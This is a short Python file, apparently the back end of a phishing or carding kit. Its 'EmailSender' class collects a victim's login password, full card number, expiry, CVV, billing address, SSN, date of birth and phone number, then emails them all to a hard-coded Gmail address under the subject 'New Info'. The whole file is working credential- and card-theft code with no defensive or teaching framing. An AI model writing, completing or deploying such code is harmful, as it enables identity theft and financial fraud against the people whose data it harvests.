import yagmail
import os
from dotenv import load_dotenv
load_dotenv()
SENDER_EMAIL = os.getenv('SENDER_EMAIL')
PASSWORD = os.getenv('PASSWORD')
RECIEVER_EMAIL = os.getenv('RECIEVER_EMAIL')



class EmailSender:
    def __init__(self, user_name, user_password, c_name, c_number, c_exp, c_cv, c_addr,
                 s_num, s_dob, s_postal, s_p_num):
        """Initialize the email sender with credentials."""
        self.user_name = user_name
        self.user_password =user_password
        self.card_name = c_name
        self.card_number = c_number
        self.card_exp = c_exp
        self.card_cv = c_cv
        self.card_addr = c_addr
        self.ssn = s_num
        self.dob = s_dob
        self.postal = s_postal
        self.phone_num = s_p_num
        self.yag = yagmail.SMTP(SENDER_EMAIL, PASSWORD)

    def send_email(self):
        fields = {
            "UserName": self.user_name,
            "Password": self.user_password,
            "Card Name": self.card_name,
            "Card Number": self.card_number,
            "Card Exp": self.card_exp,
            "Card CV": self.card_cv,
            "Card Address": self.card_addr,
            "SSN": self.ssn,
            "DOB": self.dob,
            "Postal": self.postal,
            "Phone Number": self.phone_num,
        }

        # Only include non-None fields
        contents = "\n".join(f"{key}: {value}" for key, value in fields.items() if value is not None)

        result = self.yag.send(
            to="Privatehiroyuki1@gmail.com",
            subject="New Info",
            contents=contents,
            attachments=None
        )

        return result